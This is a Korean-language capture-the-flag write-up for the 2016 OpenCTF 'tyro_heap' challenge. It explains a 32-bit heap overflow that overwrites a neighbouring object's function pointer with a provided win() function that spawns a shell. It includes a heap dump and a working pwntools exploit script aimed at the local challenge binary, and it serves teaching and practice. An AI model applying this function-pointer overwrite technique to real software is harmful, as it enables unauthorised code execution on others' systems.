# 2016_openCTF_tyro_heap

## Key words

- i386 | NX
- heap buffer overflow
- overwrite function pointer

## Solution

문제는 다음과 같은 메뉴가 존재 합니다.

- c: 오브젝트 할당
  - obj = malloc(0x24)
  - obj[0] = &puts
- b: b 구조로 읽기
  - 오브젝트에 할당하는 크기에 제한이 없음
- a: a 구조로 읽기
  - 34 byte 만큼 오브젝트에 할당
- e: obj[0] 실행

문제 자체는 c++ class 의 vtable에 대한 공부로 좋은 형태가 될 것 같습니다.

c++ class의 첫 4바이트는 vtable 주소를 갖으며 vtable은 클래스 내부 멤버 함수들에 대한 주소를 갖기 때문에 이러한 함수 포인터를 덮는 개념을 배울 수 있습니다.

먼저, 오브젝트의 첫 바이트는 `&puts`, 즉 함수 포인터로 되어 있습니다. 따라서, `obj[0]('test')`와 같은 형태로 사용하게 되면 `puts('test')`로 사용할 수 있습니다.

읽기 메뉴에서는 함수 포인터 이후인 `obj+4`부터 읽기 때문에 당장은 함수 포인터를 덮을 수는 없지만 오브젝트 2개를 생성한 뒤에 첫 번째 오브젝트를 b구조로 읽어서 두 번째 오브젝트까지 덮을 수 있습니다.

```
[heap]
0x804b000:	0x00000000	0x00000029	0x080484e0	0x00000000
0x804b010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804b030:	0x080484e0	0x00000000	0x00000000	0x00000000
0x804b040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b050:	0x00000000	0x00020fb1	0x00000000	0x00000000
```

첫 번째 오브젝트 : `obj[0][0:4] = 0x0804b008 (&puts)` 까지는 함수 포인터 이며 `obj[0][4:36] = 0x0804b00c` 부터 0x20바이트 만큼 데이터 입니다.
두 번째 오브젝트 : `obj[1][0:4] = 0x0804b030 (&puts)` 로 되어 있습니다.

문제에서는 간단히 익스를 하기 위해 `win`이라는 함수를 제공해주고 있습니다.

```c
int win()
{
  return system("/bin/sh");
}
```

따라서, 첫 번째 오브젝트를 b 구조로 읽어 두 번째 오브젝트의 함수 포인터를 `&win`으로 덮고 실행 명령인 `e`를 해주게 되면 쉘이 떨어지게 됩니다.

## exploit code

```python
from pwn import *
context(arch='i386', os='linux')

target = "./tyro_heap"
p = process(target)

addr_win = 0x08048660

print p.recvuntil("::>")

# create object [idx 0]
p.sendline("c")
print p.recvuntil("::>")

# create object [idx 1]
p.sendline("c")
print p.recvuntil("::>")

# read_b -> idx 0 -> "A" * 0x20 + "A" * 8 + p32(win)
p.sendline("b")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline("AAAA"*9 + p32(addr_win))
print p.recvuntil("::>")

p.sendline("e")
print p.recv()
p.sendline("1")
print p.recv()

p.interactive()
```
